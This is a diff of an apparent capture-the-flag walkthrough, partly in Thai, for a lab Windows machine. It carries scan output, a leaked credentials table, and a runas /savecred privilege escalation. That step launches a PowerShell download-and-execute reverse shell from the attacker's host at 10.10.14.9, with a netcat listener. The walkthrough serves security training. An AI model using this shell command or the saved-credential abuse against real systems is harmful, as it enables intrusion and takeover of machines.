@@ -32,7 +32,7 @@ Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:mi
 Host script results:
 |_clock-skew: -21m42s
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
 Nmap done: 1 IP address (1 host up) scanned in 11.92 seconds
 
 ```
@@ -46,7 +46,7 @@ Nmap done: 1 IP address (1 host up) scanned in 11.92 seconds
 feroxbuster -u http://10.10.10.98 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 
                                                                                                                                                             
  ___  ___  __   __     __      __         __   ___
-|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|__  |__  |__) |__) | /  `    /  ier | |  \ |__
 |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
 by Ben "epi" Risher 🤓                 ver: 2.11.0
 ───────────────────────────┬──────────────────────
@@ -128,8 +128,6 @@ id,username,password,Status,last_login,RoleID,Remark
 28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
 ```
 
-
-
 # Access Control.pst
 
 ```bash
@@ -191,7 +189,6 @@ The password for the “security” account has been changed to 4Cc3ssC0ntr0ller
 Regards,
 
 John
-
 ```
 
 # Shell as security 
@@ -199,7 +196,7 @@ John
 
 เราสามารถทดสอบด้วย Telnet ซึ่งจะทำให้เราสามารถเข้าถึงเป้าหมายได้ 
 
-![](./IMG/004)
+![](./IMG/004.png)
 
 # Shell as admin
 
@@ -208,7 +205,7 @@ cd C:\Users\Public\Desktop\
 type "ZKAccess3.5 Security System.lnk"
 ```
 
-![](./IMG/005)
+![](./IMG/005.png)
 
 จากการวิเคราะห์พบว่าไฟล์ .lnk มีการเรียกใช้คำสั่ง runas พร้อมกับ flag /savedcred ซึ่งบ่งชี้ว่าอาจมีการเก็บข้อมูล credentials (บัญชีผู้ใช้และรหัสผ่าน) ของ Administrator ไว้ในระบบแล้ว และเพื่อยืนยันข้อสันนิษฐานหรือใช้ในกระบวนการตรวจสอบก่อนพบไฟล์ .lnk ก็สามารถใช้คำสั่ง:
 
@@ -243,6 +240,8 @@ rlwrap nc -lvmp 443
 ## Victim 
 C:\Users\security\AppData\Local\Temp>runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.9/shell.ps1')"
 ```
+
 ![](./IMG/008.png)
 
 # Pwned 
+```
